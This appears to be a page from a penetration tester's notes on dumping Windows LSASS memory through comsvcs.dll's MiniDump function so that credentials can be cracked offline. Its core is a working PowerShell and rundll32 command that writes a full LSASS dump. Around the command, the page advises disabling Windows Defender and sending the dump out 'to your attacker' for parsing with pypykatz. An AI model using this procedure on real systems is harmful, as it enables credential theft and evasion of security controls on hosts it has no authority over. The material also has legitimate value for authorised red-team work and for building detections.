
This note does not cover the basics of Windows authentication.  For an overview of local Windows authentication, reference my [Windows Authentication](../Windows%20Authentication.md) note.
## Overview
---
**comsvcs.dll** is a dynamic-link library (DLL) that is part of the Microsoft Component Services, which provides a set of tools and services for managing COM components.  It's a critical file for COM functionality on Windows systems.  Specifically, it contains a `MiniDump` class which is responsible for creating a minidump file, which is a small, detailed snapshot of a process's memory at a particular point in time.

- This means with the right permissions, the `MiniDump` class within `comsvcs.dll` can be utilized to dump ``lsass.exe`` process memory to a file to be extracted and cracked offline.
## Usage
---

- This method may require a disabled Windows Defender, depending on your Windows version and definitions.  For references, see my [Neutering Windows Defender](../../08.%20Defense%20Evasion/Neutering%20Windows%20Defender.md) note.

```powershell
# Acquire "lsass.exe" PID and set outfile variable
$Process = (Get-Process -Name "lsass").Id
$OutFile = "C:/Windows/Temp/rundll"

# Dump LSASS via the "comsvcs.dll"
C:\Windows\system32\rundll32.exe C:\Windows\system32\comsvcs.dll MiniDump $Process $OutFile full
```

- Next you'll have to have exfil the dump file to your attacker and parse it with with a tool like ``pypykatz``.
	- For lateral movement methods and techniques, reference my [Windows File Transfers](../../06.%20File%20Transfers/Windows%20File%20Transfers.md) note.
	- For *pypykatz* usage, reference my [pypykatz](../Using%20Custom%20Tools/pypykatz.md) note.

